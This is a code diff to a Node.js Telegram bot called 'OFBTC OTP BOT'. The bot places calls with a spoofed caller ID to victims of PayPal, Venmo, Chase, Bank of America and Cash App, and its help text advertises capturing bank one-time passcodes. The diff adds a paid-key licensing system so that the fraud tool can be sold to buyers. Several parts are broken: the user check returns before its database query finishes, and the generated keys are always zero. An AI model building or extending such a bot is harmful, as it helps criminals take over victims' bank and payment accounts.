@@ -14,20 +14,97 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
+var sqlite3 = require('sqlite3');
+var db = new sqlite3.Database('db.sqlite3');
+
+var table = `CREATE TABLE IF NOT EXISTS entries (
+   user_key TEXT PRIMARY KEY,
+   user TEXT NOT NULL,
+   duration INTEGER NOT NULL
+ )`;
+
+db.run( table, [], function(err) {
+   if (err) {
+     console.error(err.message);
+   } else {
+     console.log('Table created successfully');
+   }
+} );
+
+
+// Define a function to insert a new entry into the table
+function insertEntry(user_key, user, duration, ctx) {
+   var sql = `INSERT INTO entries (user_key, user, duration) VALUES (?, ?, ?)`;
+   var params = [user_key, user, duration];
+ 
+   db.run(sql, params, function(err) {
+     if (err) {
+         console.error(err.message);
+     } else {
+         bot.telegram.sendMessage(ctx.chat.id, `your generted key is - ${user_key} for ${duration}`)
+     }
+   });
+}
+
+function updateEntry(user_key, user, ctx) {
+   var sql = `UPDATE entries SET user = ? WHERE user_key = ?`;
+   var params = [user, user_key];
+ 
+   db.run(sql, params, function(err) {
+     if (err) {
+       console.error(err.message);
+     } else {
+         bot.telegram.sendMessage(ctx.chat.id, `welcome to OFBTC OTP BOT. Type /checktime to see how long you have left`)
+     }
+   });
+}
+
+function allowedUser(user_key) {
+   var sql = `SELECT * FROM entries WHERE user_key = ?`;
+   var params = [user_key];
+   var result;
+
+   db.get(sql, params, function(err, row) {
+     if (err) {
+       console.error(err.message);
+     } else {
+       if (row) {
+         result = true;
+       } else {
+         result = false
+      }
+     }
+   });
+
+   return result
+}
+
 // Defined a list of allowed users (using IDs) 
-const allowedUsers = [123456789]
+const adminUsers = ['2020524303']
 
 // Defined a middleware function that checks the user 
 const userFilter = (ctx, next) => {
    // Get the user from the context 
-   // const user = ctx.from 
-   // if (allowedUsers.includes(user.id)) {
-   //    return next() 
-   // } else { 
-   //    return null 
-   // } 
-   next()
+   const user = ctx.from.id 
+   if ( allowedUser(user) ) {
+      return next() 
+   } else { 
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Restricted command, Purchase key`, {}).then(() => {})
+      return null
+   } 
 }
+
+const adminFilter = (ctx, next) => {
+   // Get the user from the context 
+   const user = ctx.from 
+   if (adminUsers.includes(user.id)) {
+      return next() 
+   } else { 
+      return null 
+   } 
+}
+
+// bot is not making the calls. possible solution could be to recharge balance
 
 async function call (spoof, customer_number, ctx, service, digit){
    console.log('command is from: ', ctx.from)
@@ -60,8 +137,6 @@ async function call (spoof, customer_number, ctx, service, digit){
 
 }
 
-
-//  COMMANDS
 bot.on('start', ctx => {
    console.log(ctx.from)
    bot.telegram.sendMessage(
@@ -98,6 +173,26 @@ bot.help(ctx => ctx.reply(`
 ➤ /paypal - Capture bank OTP\n
 `))
 
+
+// ADMIN COMMANDS
+bot.command('new_key', adminFilter, ctx => {
+   const [key, duration] = ctx.message.text.split(' ');
+   let newKey = Math.floor(Math.random())* 9999
+   insertEntry( newKey, '', duration, ctx)
+})
+
+//  USER COMMANDS
+bot.command('auth_key', ctx => {
+   const [auth, key] = ctx.message.text.split(' ');
+   updateEntry(key, ctx.from.id, ctx)
+})
+
+bot.command('checktime', ctx => {
+   let duration = ''
+   //TODO - check DATABASE duration'
+   bot.telegram.sendMessage(ctx.chat.id, `you have left ${duration} left`)
+})
+
 bot.command('call', userFilter, ctx => {
    const [command, spoof, number, service, digit ]= ctx.message.text.split(' ');
    const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
@@ -120,6 +215,7 @@ bot.command('call', userFilter, ctx => {
 
 
 })
+
 
 bot.launch();
 
